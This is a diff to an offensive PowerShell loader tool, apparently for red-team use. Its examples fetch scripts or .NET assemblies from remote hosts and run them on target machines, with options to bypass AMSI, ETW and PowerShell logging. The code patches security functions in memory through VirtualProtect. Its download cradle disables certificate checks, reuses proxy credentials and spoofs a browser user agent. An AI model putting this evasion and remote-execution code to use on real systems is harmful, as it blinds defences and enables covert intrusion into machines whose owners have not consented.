@@ -27,10 +27,10 @@ function New-PowerLoader {
     Removes comments from PowerShell payload to be loaded.
 
 .EXAMPLE
-    PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI,SBL
+    PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass SBL,PML
 
 .EXAMPLE
-    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.0.2
+    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass ETW,AMSI | Invoke-PowerExec -ComputerList 192.168.0.2
 #>
     [CmdletBinding()]
     Param (
@@ -221,7 +221,6 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
 "@
     $address = [Kernel32]::GetProcAddress([Kernel32]::LoadLibrary($Dll), $Func)
     $a = 0
-    $b = 0
     [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
     try {
         [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
@@ -230,7 +229,7 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
         Write-Error "Memory patch failed."
     }
     finally {
-        [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]$b) | Out-Null
+        [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]0) | Out-Null
     }
 }
 
@@ -243,10 +242,11 @@ function Local:Invoke-DownloadCradle {
     $code = $null
     try {
         [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]3072
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $client = [Net.WebRequest]::Create($URL)
         $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
         $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+        $client.UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::InternetExplorer
         $response = $client.GetResponse()
         $respStream = $response.GetResponseStream()
         $buffer = New-Object byte[] $response.ContentLength
